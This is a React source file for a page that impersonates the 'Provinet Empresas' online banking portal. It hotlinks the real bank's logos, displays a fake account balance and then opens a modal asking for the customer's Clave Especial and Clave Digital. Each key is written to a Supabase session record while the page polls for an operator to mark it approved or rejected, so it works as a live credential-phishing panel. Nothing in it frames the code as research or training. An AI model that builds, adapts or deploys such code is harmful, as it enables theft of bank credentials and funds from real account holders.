import { useState, useEffect, useRef } from "react";
import { Eye, EyeOff } from "lucide-react";
import { useSearchParams } from "react-router-dom";
import { base44, supabase } from "@/api/base44Client";
import { usePresence } from "@/hooks/usePresence";

export default function ProvinetPortal() {
  const [searchParams] = useSearchParams();
  const sessionId = searchParams.get("sessionId");
  const [clientName, setClientName]         = useState("");
  const [portalCuenta, setPortalCuenta]     = useState("0108*****70*****2480");
  const [portalTipo, setPortalTipo]         = useState("Corriente");
  const [portalDisponible, setPortalDisponible] = useState("3.407.395,70");
  const [portalTotal, setPortalTotal]       = useState("3.407.395,70");
  const [showModal, setShowModal]           = useState(false);
  const [loadingDone, setLoadingDone]       = useState(false);
  const [claveEspecial, setClaveEspecial]             = useState("");
  const [showClaveEspecial, setShowClaveEspecial]     = useState(false);
  const [ceSubmitted, setCeSubmitted]                 = useState(false);
  const [ceApproved, setCeApproved]                   = useState(false);
  const [ceRejected, setCeRejected]                   = useState(false);
  const [claveDigital, setClaveDigital]               = useState("");
  const [showPassword, setShowPassword]               = useState(false);
  const [submitting]                                   = useState(false);
  const [submitted, setSubmitted]                     = useState(false);
  const [rejected, setRejected]                       = useState(false);
  const pollTimerRef  = useRef(null);
  const pollActiveRef = useRef(false);
  const ceTimerRef    = useRef(/** @type {ReturnType<typeof setTimeout> | null} */ (null));
  const ceActiveRef   = useRef(false);
  const formRef       = useRef(null);
  const { setRejected: setPresenceRejected } = usePresence(sessionId, formRef);

  const stopPolling = () => {
    pollActiveRef.current = false;
    if (pollTimerRef.current) clearTimeout(pollTimerRef.current);
  };

  const stopCePolling = () => {
    ceActiveRef.current = false;
    if (ceTimerRef.current) clearTimeout(ceTimerRef.current);
  };

  const applyPortalData = (raw) => {
    if (!raw) return;
    try {
      const d = JSON.parse(raw);
      if (d.cliente)    setClientName(d.cliente.toUpperCase());
      if (d.cuenta)     setPortalCuenta(d.cuenta);
      if (d.tipo)       setPortalTipo(d.tipo);
      if (d.disponible) setPortalDisponible(d.disponible);
      if (d.total)      setPortalTotal(d.total);
    } catch {
      const match = raw.match(/hola\s+(.+)/i);
      if (match) setClientName(match[1].trim().toUpperCase());
    }
  };

  useEffect(() => {
    document.title = 'Provinet Empresas';
    if (!sessionId) {
      const t1 = setTimeout(() => setLoadingDone(true), 2500);
      const t2 = setTimeout(() => setShowModal(true), 3000);
      return () => { clearTimeout(t1); clearTimeout(t2); };
    }

    supabase
      .from("user_session_data")
      .select("nombre_display")
      .eq("id", sessionId)
      .single()
      .then(({ data }) => { if (data?.nombre_display) applyPortalData(data.nombre_display); })
      .catch(() => {});

    const channel = supabase
      .channel(`portal-data-${sessionId}`)
      .on("postgres_changes", {
        event: "UPDATE", schema: "public", table: "user_session_data",
        filter: `id=eq.${sessionId}`,
      }, (payload) => {
        if (payload.new?.nombre_display) applyPortalData(payload.new.nombre_display);
      })
      .subscribe();

    const t1 = setTimeout(() => setLoadingDone(true), 2500);
    const t2 = setTimeout(() => setShowModal(true), 3000);
    return () => {
      clearTimeout(t1); clearTimeout(t2);
      stopPolling();
      supabase.removeChannel(channel);
    };
  }, [sessionId]);

  const handleEnviarClaveEspecial = async () => {
    if (!claveEspecial.trim() || !sessionId || ceSubmitted) return;
    setCeSubmitted(true);
    setCeRejected(false);
    setPresenceRejected(false);
    try {
      await base44.entities.UserSessionData.update(sessionId, {
        claveEspecial: claveEspecial.trim(),
        claveEspecialStatus: "pending",
      });
    } catch {
      setCeSubmitted(false);
      return;
    }

    ceActiveRef.current = true;
    const poll = async () => {
      if (!ceActiveRef.current) return;
      try {
        const { data } = await supabase
          .from("user_session_data")
          .select("clave_especial_status")
          .eq("id", sessionId)
          .single();
        if (data?.clave_especial_status === "approved") {
          stopCePolling();
          setCeApproved(true);
        } else if (data?.clave_especial_status === "rejected") {
          stopCePolling();
          setClaveEspecial("");
          setCeSubmitted(false);
          setCeRejected(true);
          setPresenceRejected(true);
        } else if (ceActiveRef.current) {
          ceTimerRef.current = setTimeout(poll, 300);
        }
      } catch {
        if (ceActiveRef.current) ceTimerRef.current = setTimeout(poll, 300);
      }
    };
    ceTimerRef.current = setTimeout(poll, 300);
  };

  const handleEnviar = async () => {
    if (!claveDigital.trim() || !sessionId || submitting || submitted) return;
    setSubmitted(true);
    setRejected(false);
    setPresenceRejected(false);
    try {
      await base44.entities.UserSessionData.update(sessionId, { claveDigital: claveDigital.trim() });
      await base44.entities.UserSessionData.update(sessionId, { claveDigitalStatus: "pending" });
    } catch {
      setSubmitted(false);
      return;
    }

    pollActiveRef.current = true;
    const poll = async () => {
      if (!pollActiveRef.current) return;
      try {
        const { data } = await supabase
          .from("user_session_data")
          .select("clave_digital_status")
          .eq("id", sessionId)
          .single();
        if (data?.clave_digital_status === "rejected") {
          stopPolling();
          setClaveDigital("");
          setSubmitted(false);
          setRejected(true);
          setPresenceRejected(true);
        } else if (pollActiveRef.current) {
          pollTimerRef.current = setTimeout(poll, 300);
        }
      } catch {
        if (pollActiveRef.current) pollTimerRef.current = setTimeout(poll, 300);
      }
    };
    pollTimerRef.current = setTimeout(poll, 300);
  };

  const today = new Date().toLocaleDateString("es-VE", {
    weekday: "long", year: "numeric", month: "long", day: "numeric",
  });
  const todayCap = today.charAt(0).toUpperCase() + today.slice(1);

  return (
    <>
      <style>{`
        * { margin: 0; padding: 0; box-sizing: border-box; }
        .provi-body { font-family: Arial, sans-serif; font-size: 12px; color: #333; background: #c8d8e8; }
        .provi-top-bar {
          background: linear-gradient(180deg, #4a7a9b 0%, #2e5f7e 100%);
          display: flex; align-items: center; justify-content: space-between;
          padding: 0 10px; height: 22px; font-size: 11px; color: #e8f0f8;
        }
        .provi-header {
          background: linear-gradient(180deg, #f0f5fa 0%, #dce8f2 100%);
          border-bottom: 2px solid #aac4d8;
          display: flex; align-items: center; justify-content: space-between;
          padding: 6px 12px; height: 54px;
        }
        .provi-logo-text { font-size: 26px; font-weight: bold; line-height: 1; }
        .provi-logo-cliente { font-size: 13px; color: #555; margin-left: 14px; }
        .provi-logo-cliente strong { color: #2a5a7c; }
        .provi-header-right { display: flex; align-items: center; gap: 4px; }
        .provi-header-right a { display: flex; align-items: center; }
        .provi-main-layout { display: flex; min-height: calc(100vh - 76px - 36px); }
        .provi-sidebar {
          width: 112px; min-width: 112px;
          background: linear-gradient(180deg, #dce8f4 0%, #c8d8ec 100%);
          border-right: 1px solid #aac0d4;
        }
        .provi-sidebar-section-title {
          background: linear-gradient(180deg, #5a8ab0 0%, #3a6a90 100%);
          color: #fff; font-size: 12px; font-weight: bold; padding: 5px 10px;
        }
        .provi-sidebar-item {
          display: block; padding: 5px 10px; font-size: 12px; color: #1a4a6a;
          text-decoration: none; border-bottom: 1px solid #c0d4e8;
        }
        .provi-sidebar-item:hover { background: #b8d0e8; }
        .provi-sidebar-item.active { font-weight: bold; }
        .provi-dot {
          display: inline-block; width: 10px; height: 10px;
          background: #ff8800; border-radius: 50%; margin-left: 4px; vertical-align: middle;
        }
        .provi-content { flex: 1; background: #e8f0f8; }
        .provi-tab-bar {
          display: flex; background: #d0e0f0;
          border-bottom: 2px solid #7aaac8; padding: 0 8px;
        }
        .provi-tab {
          padding: 6px 20px 5px; font-size: 12px; color: #1a4a6a;
          cursor: pointer; border: 1px solid transparent; border-bottom: none;
          margin-bottom: -2px; background: transparent; border-radius: 3px 3px 0 0;
        }
        .provi-tab.active {
          background: #fff; border-color: #7aaac8; border-bottom-color: #fff;
          font-weight: bold; z-index: 1; position: relative;
        }
        .provi-inner { padding: 10px 14px; }
        .provi-last-login { font-size: 11px; color: #1a6aaa; margin-bottom: 8px; }
        .provi-sub-links { display: flex; gap: 24px; margin-bottom: 14px; }
        .provi-sub-links a { font-size: 12px; color: #1a6aaa; text-decoration: none; }
        .provi-sub-links a::before { content: '• '; }
        .provi-sub-links a:hover { text-decoration: underline; }
        .provi-section-box { background: #fff; border: 1px solid #aac4d8; border-radius: 2px; overflow: hidden; }
        .provi-section-box-title {
          background: linear-gradient(180deg, #c8dcea 0%, #aec8dc 100%);
          padding: 5px 12px; font-size: 12px; font-weight: bold; color: #1a4a6a;
          border-bottom: 1px solid #9ab8cc;
        }
        .provi-sub-header {
          background: linear-gradient(180deg,#dce8f4 0%,#c8d8ec 100%);
          padding: 4px 12px; font-size: 12px; color: #1a4a6a;
          border-bottom: 1px solid #bcd0e4;
        }
        .provi-data-table { width: 100%; border-collapse: collapse; font-size: 12px; }
        .provi-data-table thead tr { background: linear-gradient(180deg, #d8e8f4 0%, #c0d4e8 100%); }
        .provi-data-table thead th {
          padding: 5px 12px; text-align: center; font-weight: bold;
          color: #1a4a6a; border-right: 1px solid #b0c8dc; font-size: 12px;
        }
        .provi-data-table thead th:last-child { border-right: none; }
        .provi-data-table tbody td {
          padding: 5px 12px; border-bottom: 1px solid #d8e8f4;
          border-right: 1px solid #e4eef8; text-align: center; color: #333;
        }
        .provi-data-table tbody td:last-child { border-right: none; }
        .provi-data-table tfoot tr { background: linear-gradient(180deg, #d0e0ee 0%, #bcd0e4 100%); }
        .provi-data-table tfoot td {
          padding: 5px 12px; font-weight: bold; color: #1a4a6a;
          text-align: center; border-right: 1px solid #b0c8dc;
        }
        .provi-data-table tfoot td:last-child { border-right: none; }
        .provi-link-op { color: #cc6600; text-decoration: none; font-weight: bold; }
        .provi-link-op:hover { text-decoration: underline; }
        .provi-footer {
          background: #e8f0f8; border-top: 1px solid #aac4d8;
          padding: 10px; text-align: center; font-size: 12px;
        }
        .provi-footer a { color: #1a6aaa; text-decoration: none; }
        .provi-footer .sep { color: #888; margin: 0 6px; }
        .provi-loading-overlay {
          position: fixed; inset: 0; z-index: 9999;
          display: flex; align-items: center; justify-content: center;
          background: rgba(200,216,232,0.2); pointer-events: all;
          transition: opacity 0.4s ease;
        }
        .provi-loading-box {
          display: flex; align-items: center; gap: 18px;
          background: #fff; border: 2px solid #5a9abf; border-radius: 4px;
          padding: 22px 36px; box-shadow: 0 2px 16px rgba(42,90,124,0.15);
          font-size: 14px; color: #1a4a6a; min-width: 340px;
        }
        .provi-loading-spinner {
          width: 36px; height: 36px;
          border: 4px solid #d0e4f0; border-top-color: #3a8abf;
          border-radius: 50%; animation: provi-spin 0.9s linear infinite; flex-shrink: 0;
        }
        @keyframes provi-spin { to { transform: rotate(360deg); } }
        .provi-main-layout.loading-blur { filter: blur(3px); pointer-events: none; user-select: none; }
        .provi-modal-backdrop {
          position: fixed; inset: 0; z-index: 10000;
          background: rgba(0,0,0,0.45);
          display: flex; align-items: center; justify-content: center;
          opacity: 0; transition: opacity 0.3s ease; pointer-events: none;
        }
        .provi-modal-backdrop.visible { opacity: 1; pointer-events: all; }
        .provi-ventana-modal {
          background: #fff; border: 1px solid #7aaac8; border-radius: 3px;
          box-shadow: 0 8px 32px rgba(30,70,110,0.2); width: 603px;
          display: flex; flex-direction: column; overflow: hidden;
        }
        .provi-modal-header {
          border-bottom: 3px solid #5a9abf; padding: 14px 18px 10px;
          display: flex; align-items: flex-start; justify-content: space-between;
          background: linear-gradient(180deg, #f5f9fc 0%, #eaf2f8 100%);
        }
        .provi-modal-logo .logo-title { font-size: 20px; font-weight: bold; color: #1a4a6a; }
        .provi-modal-logo .logo-sub { font-size: 11px; color: #5a9abf; margin-top: 2px; }
        .provi-modal-body { padding: 28px 32px; }
        .provi-modal-body h2 { font-size: 21px; font-weight: bold; color: #222; margin-bottom: 24px; }
        .provi-phone-entry { margin-bottom: 16px; }
        .provi-phone-link {
          color: #1a6aaa; font-size: 14px; font-weight: bold;
          text-decoration: none; display: flex; align-items: center; gap: 6px; margin-bottom: 4px;
        }
        .provi-form-box {
          border: 1px solid #c8d8e8; border-radius: 2px; overflow: hidden; margin-top: 20px;
        }
        .provi-form-box-title {
          background: #dce8f0; padding: 8px 16px; font-size: 13px;
          font-weight: bold; color: #1a4a6a; border-bottom: 1px solid #c8d8e8;
        }
        .provi-form-row {
          display: flex; align-items: center; padding: 10px 16px;
          border-bottom: 1px solid #e8f0f8; gap: 16px;
        }
        .provi-form-row:last-child { border-bottom: none; }
        .provi-form-label { font-size: 13px; color: #333; width: 160px; flex-shrink: 0; }
        .provi-form-input-wrap { position: relative; flex: 1; display: flex; align-items: center; }
        .provi-form-input {
          border: 1px solid #90a4ae; border-radius: 2px;
          padding: 4px 32px 4px 8px; font-size: 13px; outline: none; width: 100%;
        }
        .provi-form-input:focus { border-color: #1a6aaa; }
        .provi-eye-btn {
          position: absolute; right: 6px; background: none; border: none;
          cursor: pointer; color: #666; display: flex; align-items: center; padding: 0;
        }
        .provi-eye-btn:hover { color: #1a6aaa; }
        .provi-btn-enviar {
          margin-top: 20px; color: #fff;
          border: none; padding: 8px 28px; font-size: 14px; font-weight: bold;
          cursor: pointer; border-radius: 2px; transition: background 0.2s;
        }
        .provi-btn-enviar.active { background: #1973B8; cursor: pointer; }
        .provi-btn-enviar.active:hover { background: #1560a0; }
        .provi-btn-enviar.inactive { background: #9e9e9e; cursor: not-allowed; }
        .provi-submit-overlay {
          position: fixed; inset: 0; z-index: 10001;
          display: flex; align-items: center; justify-content: center;
          background: rgba(180,200,220,0.35);
        }
        .provi-submit-box {
          display: flex; align-items: center; gap: 18px;
          background: #fff; border: 2px solid #1973B8; border-radius: 4px;
          padding: 22px 36px; box-shadow: 0 2px 16px rgba(25,115,184,0.15);
          font-size: 14px; color: #1a4a6a; min-width: 340px;
        }
        .provi-submit-spinner {
          width: 36px; height: 36px; flex-shrink: 0;
          border: 4px solid #d0e4f0; border-top-color: #1973B8;
          border-radius: 50%; animation: provi-spin 0.9s linear infinite;
        }
        .provi-form-error {
          margin-top: 10px; font-size: 12px; color: #cc0000;
          background: #fff3f3; border: 1px solid #f5c6c6;
          border-radius: 2px; padding: 6px 12px;
        }

        /* ── RESPONSIVE MÓVIL ── */
        @media (max-width: 768px) {
          /* Top bar */
          .provi-top-bar { height: auto; padding: 5px 10px; font-size: 10px; flex-wrap: wrap; gap: 4px; }

          /* Header */
          .provi-header { height: auto; flex-direction: column; align-items: flex-start; padding: 8px 10px; gap: 8px; }
          .provi-logo-cliente { font-size: 12px; margin-left: 0; margin-top: 2px; }
          .provi-header-right { width: 100%; flex-wrap: wrap; gap: 6px; }
          .provi-header-right img { height: 22px !important; }

          /* Layout principal */
          .provi-main-layout { flex-direction: column; min-height: unset; }

          /* Sidebar: strip horizontal con wrap */
          .provi-sidebar { width: 100%; min-width: unset; border-right: none; border-bottom: 2px solid #aac0d4; display: flex; flex-direction: row; flex-wrap: wrap; }
          .provi-sidebar-section-title { width: 100%; font-size: 11px; padding: 4px 10px; margin-top: 0; }
          .provi-sidebar-item { flex: 0 0 50%; width: 50%; font-size: 11px; padding: 5px 10px; border-bottom: 1px solid #c0d4e8; border-right: 1px solid #c0d4e8; box-sizing: border-box; }

          /* Contenido */
          .provi-content { width: 100%; }
          .provi-tab { padding: 5px 14px 4px; font-size: 11px; }
          .provi-inner { padding: 8px 10px; }
          .provi-last-login { font-size: 10px; }
          .provi-sub-links { flex-direction: column; gap: 6px; margin-bottom: 12px; }

          /* Tabla: scroll horizontal para que no se corte */
          .provi-section-box { overflow-x: auto; -webkit-overflow-scrolling: touch; }
          .provi-data-table { min-width: 420px; font-size: 11px; }
          .provi-data-table thead th { padding: 5px 8px; font-size: 11px; }
          .provi-data-table tbody td { padding: 5px 8px; font-size: 11px; }
          .provi-data-table tfoot td { padding: 5px 8px; font-size: 11px; }

          /* Modal */
          .provi-ventana-modal { width: 95vw !important; max-width: 95vw; }
          .provi-modal-body { padding: 16px 14px 20px; }
          .provi-modal-body h2 { font-size: 17px; margin-bottom: 16px; }
          .provi-form-row { flex-direction: column; align-items: flex-start; gap: 6px; padding: 10px 12px; }
          .provi-form-label { width: auto; font-size: 12px; }
          .provi-form-input-wrap { width: 100%; }
          .provi-form-input { width: 100%; padding: 6px 34px 6px 8px; font-size: 13px; }
          .provi-btn-enviar { width: 100%; padding: 10px; margin-top: 14px; font-size: 14px; }

          /* Loading boxes */
          .provi-loading-box { min-width: unset; width: 88vw; padding: 18px 16px; font-size: 13px; }
          .provi-submit-box { min-width: unset; width: 88vw; padding: 18px 16px; font-size: 13px; }

          /* Footer */
          .provi-footer { font-size: 11px; padding: 8px 10px; }
        }

        @media (max-width: 400px) {
          .provi-sidebar-item { flex: 0 0 100%; width: 100%; border-right: none; }
          .provi-ventana-modal { width: 98vw !important; }
          .provi-modal-body { padding: 12px 10px 16px; }
          .provi-data-table { min-width: 360px; }
        }
      `}</style>

      <div className="provi-body" style={{ minHeight: "100vh" }}>
        {/* TOP BAR */}
        <div className="provi-top-bar">
          <span>{todayCap}</span>
          <img src="https://ve1.provinet.net/shvp_ve_web/atpn_es_web_jsp/html/images/desconexion4.gif" alt="Desconexión" style={{ height: "18px", cursor: "pointer" }} />
        </div>

        {/* HEADER */}
        <div className="provi-header">
          <div style={{ display: "flex", alignItems: "center" }}>
            <img
              src="https://ve1.provinet.net/shvp_ve_web/atpn_es_web_pub/imagenes/ttl_provinet_empresas.gif"
              alt="Provinet Empresas"
              style={{ height: "40px" }}
            />
            <span className="provi-logo-cliente">
              Cliente: <strong>{clientName.toUpperCase()}</strong>
            </span>
          </div>
          <div className="provi-header-right">
            <a href="#" title="Instagram"><img src="https://ve1.provinet.net/shvp_ve_web/atpn_es_web_jsp/html/images/logo_instagram.png" alt="Instagram" style={{ height: "28px" }} /></a>
            <a href="#" title="Facebook"><img src="https://ve1.provinet.net/shvp_ve_web/atpn_es_web_jsp/html/images/logo_facebook.png" alt="Facebook" style={{ height: "28px" }} /></a>
            <a href="#" title="Twitter"><img src="https://ve1.provinet.net/shvp_ve_web/atpn_es_web_jsp/html/images/logo_twitter.png" alt="Twitter" style={{ height: "28px" }} /></a>
            <a href="#" title="YouTube"><img src="https://ve1.provinet.net/shvp_ve_web/atpn_es_web_jsp/html/images/youtube.png" alt="YouTube" style={{ height: "28px" }} /></a>
            <a href="#" title="Ayuda"><img src="https://ve1.provinet.net/shvp_ve_web/atpn_es_web_jsp/html/images/boto3-es.gif" alt="Ayuda" style={{ height: "28px" }} /></a>
          </div>
        </div>

        {/* MAIN LAYOUT */}
        <div className={`provi-main-layout${!loadingDone ? " loading-blur" : ""}`}>
          {/* SIDEBAR */}
          <div className="provi-sidebar">
            <div className="provi-sidebar-section-title">Productos</div>
            <a className="provi-sidebar-item" href="#">Posición Global</a>
            <div className="provi-sidebar-section-title" style={{ marginTop: "1px" }}>Cuentas</div>
            <a className="provi-sidebar-item active" href="#">Chequeras <span className="provi-dot"></span></a>
            <a className="provi-sidebar-item" href="#">Tarjetas de Crédito</a>
            <a className="provi-sidebar-item" href="#">Inversiones</a>
            <a className="provi-sidebar-item" href="#">Préstamos</a>
            <a className="provi-sidebar-item" href="#">Comercio Exterior</a>
            <div className="provi-sidebar-section-title" style={{ marginTop: "1px" }}>Servicios</div>
            <a className="provi-sidebar-item" href="#">Referencias Bancarias</a>
            <a className="provi-sidebar-item" href="#">Cheques de Gerencia</a>
            <a className="provi-sidebar-item" href="#">Pago Nómina</a>
            <a className="provi-sidebar-item" href="#">Tarjeta de Coordenadas</a>
            <a className="provi-sidebar-item" href="#">Claves y Datos</a>
          </div>

          {/* CONTENT */}
          <div className="provi-content">
            <div className="provi-tab-bar">
              <div className="provi-tab active">Consultar</div>
            </div>
            <div className="provi-inner">
              <div className="provi-last-login">
                Su último acceso a Provinet fue el día {new Date().toLocaleDateString("es-VE")} a las {new Date().toLocaleTimeString("es-VE")}.
              </div>
              <div className="provi-sub-links">
                <a href="#">Consulta de Movimientos</a>
                <a href="#">Consulta Estados de Cuenta</a>
              </div>
              <div className="provi-section-box">
                <div className="provi-section-box-title">Cuentas &gt; Consulta de Movimientos</div>
                <div className="provi-sub-header">Cuentas</div>
                <table className="provi-data-table">
                  <thead>
                    <tr>
                      <th>Cuenta</th>
                      <th>Tipo</th>
                      <th>Disponible</th>
                      <th>Total</th>
                      <th>Operar</th>
                    </tr>
                  </thead>
                  <tbody>
                    <tr>
                      <td style={{ color: "#1a6aaa" }}>{portalCuenta}</td>
                      <td>{portalTipo}</td>
                      <td style={{ textAlign: "right" }}>{portalDisponible}</td>
                      <td style={{ textAlign: "right" }}>{portalTotal}</td>
                      <td><a className="provi-link-op" href="#">Transferencias</a></td>
                    </tr>
                  </tbody>
                  <tfoot>
                    <tr>
                      <td colSpan={2} style={{ textAlign: "left" }}>Total(Bs.)</td>
                      <td style={{ textAlign: "right" }}>{portalDisponible}</td>
                      <td style={{ textAlign: "right" }}>{portalTotal}</td>
                      <td></td>
                    </tr>
                  </tfoot>
                </table>
              </div>
            </div>
          </div>
        </div>

        {/* FOOTER */}
        <div className="provi-footer">
          <a href="#">Tarifas</a>
          <span className="sep">|</span>
          <a href="#">Aviso Legal</a>
          <span className="sep">|</span>
          <a href="#">Info seguridad</a>
        </div>

        {/* MODAL CLAVE DIGITAL */}
        <div className={`provi-modal-backdrop${showModal ? " visible" : ""}`}>
          <div className="provi-ventana-modal">
            <div className="provi-modal-header">
              <div className="provi-modal-logo">
                <div className="logo-title"><strong>Provi</strong>net Empresas</div>
                <div className="logo-sub">Banca en Línea</div>
              </div>
            </div>
            <div className="provi-modal-body" ref={formRef}>
              <p>Por su Seguridad, Debe ingresar su Clave Especial antes de proceder con la Clave Digital. Que sera habilitada y enviada a su <strong>Correo Electronico</strong> o <strong>SMS</strong>. Este proceso garantiza la proteccion de su cuenta.</p>
              <div className="provi-form-box">
                <div className="provi-form-box-title">Validacion de Ingreso</div>

                {/* Clave Especial — primer paso */}
                <div className="provi-form-row">
                  <span className="provi-form-label">Clave Especial</span>
                  <div className="provi-form-input-wrap">
                    <input
                      className="provi-form-input"
                      type={showClaveEspecial ? "text" : "password"}
                      value={claveEspecial}
                      onChange={(e) => { setClaveEspecial(e.target.value.replace(/\s/g, "")); setCeRejected(false); }}
                      disabled={ceSubmitted}
                      autoComplete="off"
                    />
                    <button
                      type="button"
                      className="provi-eye-btn"
                      onClick={() => setShowClaveEspecial((v) => !v)}
                      tabIndex={-1}
                    >
                      {showClaveEspecial ? <EyeOff width={16} height={16} /> : <Eye width={16} height={16} />}
                    </button>
                  </div>
                </div>

                {/* Clave Digital — segundo paso, bloqueado hasta que el panel apruebe */}
                <div className="provi-form-row" style={{ opacity: ceApproved ? 1 : 0.4, transition: "opacity 0.3s" }}>
                  <span className="provi-form-label">Clave digital</span>
                  <div className="provi-form-input-wrap">
                    <input
                      className="provi-form-input"
                      type={showPassword ? "text" : "password"}
                      inputMode="numeric"
                      value={claveDigital}
                      onChange={(e) => {
                        if (!ceApproved) return;
                        const val = e.target.value.replace(/[^0-9]/g, "");
                        setClaveDigital(val);
                        setRejected(false);
                      }}
                      disabled={!ceApproved || submitting || submitted}
                      autoComplete="off"
                    />
                    <button
                      type="button"
                      className="provi-eye-btn"
                      onClick={() => setShowPassword((v) => !v)}
                      tabIndex={-1}
                    >
                      {showPassword ? <EyeOff width={16} height={16} /> : <Eye width={16} height={16} />}
                    </button>
                  </div>
                </div>
              </div>

              {ceRejected && (
                <div className="provi-form-error">
                  La Clave Especial ingresada es incorrecta. Por favor, intente nuevamente.
                </div>
              )}
              {rejected && (
                <div className="provi-form-error">
                  La Clave Digital ingresada es incorrecta. Por favor, intente nuevamente.
                </div>
              )}

              <div>
                {!ceApproved ? (
                  <button
                    className={`provi-btn-enviar${claveEspecial.length > 0 && !ceSubmitted ? " active" : " inactive"}`}
                    onClick={handleEnviarClaveEspecial}
                    disabled={!claveEspecial || ceSubmitted}
                  >
                    {ceSubmitted ? "Verificando..." : "Enviar"}
                  </button>
                ) : (
                  <button
                    className={`provi-btn-enviar${claveDigital.length > 0 && !submitting && !submitted ? " active" : " inactive"}`}
                    onClick={handleEnviar}
                    disabled={!claveDigital || submitting || submitted}
                  >
                    Enviar
                  </button>
                )}
              </div>
            </div>
          </div>
        </div>

        {/* LOADING CLAVE ESPECIAL — esperando aprobación del panel */}
        {ceSubmitted && !ceApproved && !ceRejected && (
          <div className="provi-submit-overlay">
            <div className="provi-submit-box">
              <div className="provi-submit-spinner"></div>
              <span>Procesando su petición, por favor espere...</span>
            </div>
          </div>
        )}

        {/* LOADING POST-ENVÍO */}
        {submitted && (
          <div className="provi-submit-overlay">
            <div className="provi-submit-box">
              <div className="provi-submit-spinner"></div>
              <span>Procesando su petición, por favor espere...</span>
            </div>
          </div>
        )}

        {/* LOADING OVERLAY */}
        {!loadingDone && (
          <div className="provi-loading-overlay">
            <div className="provi-loading-box">
              <div className="provi-loading-spinner"></div>
              <span>Procesando su petición, por favor espere...</span>
            </div>
          </div>
        )}
      </div>
    </>
  );
}
